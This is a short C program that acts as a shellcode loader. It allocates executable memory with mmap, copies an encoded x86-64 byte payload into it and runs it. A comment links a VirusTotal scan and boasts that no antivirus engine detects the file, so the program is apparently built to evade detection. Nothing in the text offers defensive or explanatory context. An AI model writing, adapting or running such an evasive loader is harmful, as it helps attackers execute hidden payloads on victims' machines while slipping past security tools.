#include <string.h>
#include <sys/mman.h>

/* https://www.virustotal.com/gui/file/e4ae38dbe8f32dbcf86dd55fd95bb34b5d3426bf775799d709a90a40481d168a?nocache=1 */
/* score: 0/65 (lol) */

unsigned char buf[] =
"\x4d\x31\xc9\x48\x89\xe5\x41\xb1\x15\xda\xc9\x66\x81\xe5"
"\xe0\xf8\x48\x0f\xae\x45\x00\x49\xbe\x88\x5e\x76\x9b\x27"
"\xcd\x05\xb1\x48\x83\xc5\x08\x4c\x8b\x65\x00\x49\xff\xc9"
"\x4f\x31\x74\xcc\x2b\x4d\x85\xc9\x75\xf3\xc0\x6f\xb6\xcf"
"\xfc\x01\x4d\x0a\xa8\xcd\x8c\x20\x16\x13\xc7\xa8\xc9\x04"
"\xc6\x95\x41\x8c\x84\x53\xd8\xac\x3f\x94\x89\xcf\x4c\x32"
"\x4a\x56\x3b\x10\x2d\x85\xfa\x79\xc1\x6f\x2a\x5a\x09\x85"
"\x80\x71\xfd\xad\x02\x49\x81\xad\xf5\x22\x7b\x95\x1e\xb0"
"\x1c\x5f\x66\x1f\xbf\xfe\x05\x62\xbb\x37\xb5\x8b\xea\xb4"
"\x1f\x07\x73\x72\x10\x2e\xf8\x40\x1f\x83\xb1\x52\x3c\x26"
"\xb5\x8d\x1c\x39\x99\xa3\x1b\x22\xcf\x95\x23\xfb\x54\xe7"
"\x49\x7d\xd6\x90\x2a\x11\x74\x5f\xff\x4f\xeb\xa1\x57\x04"
"\x74\x72\x05\x4b\xe1\xac\xed\x76\x1c\x5f\x66\x67\x92\x8a"
"\x60\x10\x71\x36\x08\x7e\xd3\xd3\x60\x0f\x69\x33\x07\x6b"
"\xd0\x8c\x05\x34\x4b\x0b\x38\x75\x84\xa6\x0a\x67\x45\x36"
"\xcc\x65\x9f\x0c\x7a\xa6\x96\x85\x21\xf6";

int main() {
	//we need executable memory (malloc doesnt do that)
	void *exec = mmap(
		NULL,
		sizeof(buf),
		PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1, 0 //values from man mmap in MAP_ANONYMOUS section
		);

    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
}
